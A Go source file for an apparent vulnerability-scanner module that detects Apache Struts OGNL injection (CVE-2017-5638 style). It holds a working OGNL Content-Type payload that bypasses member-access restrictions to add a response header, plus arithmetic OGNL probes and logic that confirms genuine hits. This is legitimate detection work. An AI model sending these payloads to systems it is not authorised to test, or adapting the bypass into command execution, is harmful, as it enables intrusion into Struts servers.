package struts_ognl_injection

import (
	"fmt"
	"strconv"
	"strings"

	"github.com/pkg/errors"
	"github.com/vigolium/vigolium/pkg/core/hosterrors"
	"github.com/vigolium/vigolium/pkg/dedup"
	"github.com/vigolium/vigolium/pkg/http"
	"github.com/vigolium/vigolium/pkg/httpmsg"
	"github.com/vigolium/vigolium/pkg/modules/modkit"
	"github.com/vigolium/vigolium/pkg/output"
	"github.com/vigolium/vigolium/pkg/utils"
)

const (
	ognlMultA = 41273
	ognlMultB = 39127

	// strutsTestHeader is the response header a genuine OGNL evaluation of the
	// addHeader() payload emits. Detection of the header-add variant keys on this
	// being a REAL parsed response header — never on the marker merely appearing
	// in the body — because a gateway that rejects the request (415 / 400) commonly
	// echoes the injected Content-Type verbatim into the error body and into other
	// header VALUES (e.g. gRPC's Grpc-Message), which reflects both "X-Struts-Test"
	// and the baked marker without any OGNL ever running. See headerAddContentType.
	strutsTestHeader = "X-Struts-Test"
)

// ognlResult is the product the injected OGNL expression evaluates to. It is
// COMPUTED from the operands rather than hardcoded: a prior literal ("1614244871")
// did not actually equal 41273*39127 (=1614888671), so the module searched for a
// product no real Struts target ever returns and its genuine detection was broken.
// Deriving it keeps the marker in lockstep with the operands forever. The product
// fits under Java's 32-bit Integer.MAX_VALUE, so OGNL's int*int does not overflow.
var ognlResult = strconv.Itoa(ognlMultA * ognlMultB)

// headerAddContentType builds the "add a response header" OGNL Content-Type
// payload (CVE-2017-5638 / S2-045 style) that sets X-Struts-Test to the supplied
// marker. Genuine evaluation surfaces the marker as a real response HEADER, which
// a reflected error body cannot forge — so both detection and confirmation read
// the parsed header rather than scanning the response text.
func headerAddContentType(marker string) string {
	return fmt.Sprintf("%%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess=#dm).(#res=@org.apache.struts2.ServletActionContext@getResponse()).(#res.addHeader('%s','%s'))}", strutsTestHeader, marker)
}

// ognlPrimaryExpr is the literal multiplication embedded in the math payloads
// (ognlMultA*ognlMultB). The reflection-tracking confirmation swaps exactly this
// substring for a fresh random expression to re-derive a probe, so it must match
// the operands the payloads are built from.
var ognlPrimaryExpr = strconv.Itoa(ognlMultA) + "*" + strconv.Itoa(ognlMultB)

// confirmOgnlEvaluates re-injects the matched OGNL math payload with FRESH random
// operands (modkit.FreshMultExpr, whose 4-digit operands keep the product under
// Java's 32-bit Integer.MAX_VALUE so OGNL's int*int does not overflow) and requires
// the newly-computed product to appear in the response each round. reinject applies
// a payload string to the request exactly as the matching probe did (Content-Type
// rewrite or insertion-point build) and returns the raw request (ok=false when it
// cannot be rebuilt). A genuine OGNL evaluation tracks the changing operands every
// round; a page that merely contains the fixed product (1614888671 — a plausible id
// / old unix timestamp) cannot predict a fresh random product, so it is dropped.
//
// The header-add variant carries no A*B expression to track and is confirmed
// separately by confirmHeaderAddEvaluates. Returns (confirmed, err): err != nil
// (transport/parse failure) makes the caller fail OPEN rather than suppress a
// genuine finding.
func (m *Module) confirmOgnlEvaluates(
	ctx *httpmsg.HttpRequestResponse,
	httpClient *http.Requester,
	matchedPayload string,
	reinject func(payload string) ([]byte, bool),
) (bool, error) {
	if !strings.Contains(matchedPayload, ognlPrimaryExpr) {
		return true, nil // no A*B expression to track (header-add path is confirmed elsewhere)
	}
	const rounds = 2
	for i := 0; i < rounds; i++ {
		freshExpr, product := modkit.FreshMultExpr()
		payload := strings.Replace(matchedPayload, ognlPrimaryExpr, freshExpr, 1)

		raw, ok := reinject(payload)
		if !ok {
			return true, nil // cannot rebuild the probe → fail open
		}
		req := httpmsg.NewRequestResponseRaw(raw, ctx.Service())
		resp, _, err := httpClient.Execute(req, http.Options{NoClustering: true})
		if err != nil {
			return false, err
		}
		if resp.Response() == nil {
			resp.Close()
			return false, fmt.Errorf("struts-ognl confirmation: nil response")
		}
		hit := strings.Contains(resp.Body().String(), product)
		resp.Close()
		if !hit {
			return false, nil // fresh product did not evaluate → coincidental match
		}
	}
	return true, nil
}

// confirmHeaderAddEvaluates re-injects the addHeader OGNL payload with a FRESH
// random marker and requires that exact marker to come back as a genuine
// X-Struts-Test RESPONSE HEADER on each round. A gateway that merely reflects the
// injected Content-Type into an error body echoes the baked static marker but can
// never emit an arbitrary header the scanner picks at request time, so only real
// server-side OGNL evaluation tracks the fresh marker. reinject applies a
// Content-Type string to the request exactly as the matching probe did and returns
// the raw request (ok=false when it cannot be rebuilt → fail open). Returns
// (confirmed, err): err != nil (transport failure) makes the caller fail OPEN.
func (m *Module) confirmHeaderAddEvaluates(
	ctx *httpmsg.HttpRequestResponse,
	httpClient *http.Requester,
	reinject func(contentType string) ([]byte, bool),
) (bool, error) {
	const rounds = 2
	for i := 0; i < rounds; i++ {
		marker := modkit.FreshCanary()
		raw, ok := reinject(headerAddContentType(marker))
		if !ok {
			return true, nil // cannot rebuild the probe → fail open
		}
		req := httpmsg.NewRequestResponseRaw(raw, ctx.Service())
		resp, _, err := httpClient.Execute(req, http.Options{NoClustering: true})
		if err != nil {
			return false, err
		}
		httpResp := resp.Response()
		hit := httpResp != nil && strings.Contains(httpResp.Header.Get(strutsTestHeader), marker)
		resp.Close()
		if !hit {
			return false, nil // fresh marker never became a real header → reflected/static
		}
	}
	return true, nil
}

// contentTypePayload defines a Content-Type OGNL injection test case. headerAdd
// selects the confirmation-and-detection strategy: true reads the genuine
// X-Struts-Test response header (addHeader variant), false searches the body for
// the evaluated product (arithmetic variant).
type contentTypePayload struct {
	name        string
	contentType string
	headerAdd   bool
}

var contentTypePayloads = []contentTypePayload{
	{
		name:        "struts2-ct-ognl",
		contentType: headerAddContentType(ognlResult),
		headerAdd:   true,
	},
	{
		name:        "struts2-ct-simple",
		contentType: fmt.Sprintf("%%{%d*%d}", ognlMultA, ognlMultB),
	},
}

// paramPayload defines a parameter-level OGNL injection test case.
type paramPayload struct {
	payload string
}

var paramPayloads = []paramPayload{
	{payload: fmt.Sprintf("%%{%d*%d}", ognlMultA, ognlMultB)},
	{payload: fmt.Sprintf("${%d*%d}", ognlMultA, ognlMultB)},
}

// Module implements the Struts OGNL injection active scanner.
type Module struct {
	modkit.BaseActiveModule
	ds  dedup.Lazy[dedup.DiskSet]
	rhm dedup.Lazy[dedup.RequestHashManager]
}

// New creates a new Struts OGNL Injection module.
func New() *Module {
	m := &Module{
		BaseActiveModule: modkit.NewBaseActiveModule(
			ModuleID,
			ModuleName,
			ModuleDesc,
			ModuleShort,
			ModuleConfirmation,
			ModuleSeverity,
			ModuleConfidence,
			modkit.ScanScopeRequest|modkit.ScanScopeInsertionPoint,
			modkit.AllParamTypes,
		),
		ds:  dedup.LazyDiskSet("struts_ognl_injection"),
		rhm: dedup.LazyDefaultRHM("struts_ognl_injection"),
	}
	m.ModuleTags = ModuleTags
	return m
}

// ConfirmsByBodyDifferential opts this module into the executor's body-
// differential safety net: a candidate finding is re-confirmed by replaying the
// OGNL payload request and verifying the evaluated result reproducibly appears
// as content absent from the clean baseline before being reported.
func (m *Module) ConfirmsByBodyDifferential() bool { return true }

// ScanPerRequest tests Content-Type header OGNL injection (CVE-2017-5638 style).
func (m *Module) ScanPerRequest(
	ctx *httpmsg.HttpRequestResponse,
	httpClient *http.Requester,
	scanCtx *modkit.ScanContext,
) ([]*output.ResultEvent, error) {
	urlx, err := ctx.URL()
	if err != nil {
		return nil, errors.Wrap(err, "failed to get URL")
	}

	if utils.IsMediaAndJSURL(urlx.Path) {
		return nil, nil
	}

	// Dedup by host+path
	diskSet := m.ds.Get(scanCtx.DedupMgr())
	hash := utils.Sha1(fmt.Sprintf("%s%s", urlx.Host, urlx.Path))
	if diskSet != nil && diskSet.IsSeen(hash) {
		return nil, nil
	}

	for _, p := range contentTypePayloads {
		modifiedRaw, err := httpmsg.SetContentType(ctx.Request().Raw(), p.contentType)
		if err != nil {
			continue
		}

		// SetContentType produces well-formed raw, so wrap directly instead
		// of re-parsing on this hot path.
		fuzzedReq := httpmsg.NewRequestResponseRaw(modifiedRaw, ctx.Service())

		resp, _, err := httpClient.Execute(fuzzedReq, http.Options{})
		if err != nil {
			if errors.Is(err, hosterrors.ErrUnresponsiveHost) {
				return nil, nil
			}
			continue
		}

		// Check for OGNL evaluation evidence. The two payload shapes have DIFFERENT
		// genuine signals, and conflating them is what let a reflected error body
		// (415 "Content-Type '<echoed payload>' is not supported") masquerade as a
		// hit — the echo carries both "X-Struts-Test" and the baked marker.
		var (
			matched     bool
			description string
		)
		if p.headerAdd {
			// addHeader variant: the ONLY genuine proof is a real X-Struts-Test
			// RESPONSE HEADER (a distinct parsed key). Reflection into the body or
			// into another header's value cannot forge that key, so scan only the
			// parsed headers here.
			httpResp := resp.Response()
			matched = httpResp != nil && strings.Contains(httpResp.Header.Get(strutsTestHeader), ognlResult)
			description = fmt.Sprintf("OGNL expression evaluated in Content-Type header — computed result %q returned as the %s response header", ognlResult, strutsTestHeader)
		} else {
			// Arithmetic variant: the product only appears when OGNL computes A*B.
			// The payload string itself ("%{41273*39127}") never contains the
			// product, so a verbatim reflection cannot produce it — strip any
			// reflected payload copy anyway before searching, as defense in depth.
			cleaned := modkit.StripReflected(resp.Body().String(), p.contentType)
			matched = strings.Contains(cleaned, ognlResult)
			description = fmt.Sprintf("OGNL expression evaluated in Content-Type header — result %q found in response body", ognlResult)
		}

		if matched {
			fullResp := resp.FullResponseString()
			resp.Close()
			// Confirm the signal tracks a FRESH probe before reporting a Critical
			// finding: the arithmetic variant re-derives the product from fresh
			// operands, the header-add variant re-injects a fresh marker and requires
			// it back as a real header — so a static page carrying the baked marker
			// (or a fixed number in the body) can never be confirmed.
			reinject := func(contentType string) ([]byte, bool) {
				raw, err := httpmsg.SetContentType(ctx.Request().Raw(), contentType)
				return raw, err == nil
			}
			var confirmed bool
			var cerr error
			if p.headerAdd {
				confirmed, cerr = m.confirmHeaderAddEvaluates(ctx, httpClient, reinject)
			} else {
				confirmed, cerr = m.confirmOgnlEvaluates(ctx, httpClient, p.contentType, reinject)
			}
			if cerr == nil && !confirmed {
				continue
			}
			result := &output.ResultEvent{
				URL:              urlx.String(),
				Matched:          urlx.String(),
				Request:          string(modifiedRaw),
				Response:         fullResp,
				FuzzingParameter: "Content-Type",
				ExtractedResults: []string{ognlResult},
				Info: output.Info{
					Name:        fmt.Sprintf("Struts OGNL Injection: %s", p.name),
					Description: description,
				},
			}
			return []*output.ResultEvent{result}, nil
		}
		resp.Close()
	}

	return nil, nil
}

// ScanPerInsertionPoint tests parameter-level OGNL injection.
func (m *Module) ScanPerInsertionPoint(
	ctx *httpmsg.HttpRequestResponse,
	ip httpmsg.InsertionPoint,
	httpClient *http.Requester,
	scanCtx *modkit.ScanContext,
) ([]*output.ResultEvent, error) {
	urlx, err := ctx.URL()
	if err != nil {
		return nil, errors.Wrap(err, "failed to get URL")
	}

	// Dedup by request hash + param via RHM
	rhm := m.rhm.Get(scanCtx.DedupMgr())
	if rhm != nil {
		paramName := ip.Name()
		paramType := fmt.Sprintf("%d", ip.Type())
		if !rhm.ShouldCheckInsertionPoint(urlx, ctx.Request(), paramName, ip.BaseValue(), paramType) {
			return nil, nil
		}
	}

	for _, p := range paramPayloads {
		fuzzedRaw := ip.BuildRequest([]byte(p.payload))

		// BuildRequest produces well-formed raw, so wrap directly instead
		// of re-parsing on this hot path.
		fuzzedReq := httpmsg.NewRequestResponseRaw(fuzzedRaw, ctx.Service())

		resp, _, err := httpClient.Execute(fuzzedReq, http.Options{})
		if err != nil {
			if errors.Is(err, hosterrors.ErrUnresponsiveHost) {
				return nil, nil
			}
			continue
		}

		body := resp.Body().String()
		if strings.Contains(body, ognlResult) {
			fullResp := resp.FullResponseString()
			resp.Close()
			// Confirm the result tracks fresh operands before reporting a Critical
			// finding (the fixed product appearing in the page by coincidence must
			// not flag).
			if confirmed, cerr := m.confirmOgnlEvaluates(ctx, httpClient, p.payload, func(payload string) ([]byte, bool) {
				return ip.BuildRequest([]byte(payload)), true
			}); cerr == nil && !confirmed {
				continue
			}
			result := &output.ResultEvent{
				URL:              urlx.String(),
				Matched:          urlx.String(),
				Request:          string(fuzzedRaw),
				Response:         fullResp,
				FuzzingParameter: ip.Name(),
				ExtractedResults: []string{ognlResult},
				Info: output.Info{
					Name:        "Struts OGNL Injection: parameter",
					Description: fmt.Sprintf("OGNL expression evaluated in parameter %q — result %q found in response", ip.Name(), ognlResult),
				},
			}
			return []*output.ResultEvent{result}, nil
		}
		resp.Close()
	}

	return nil, nil
}
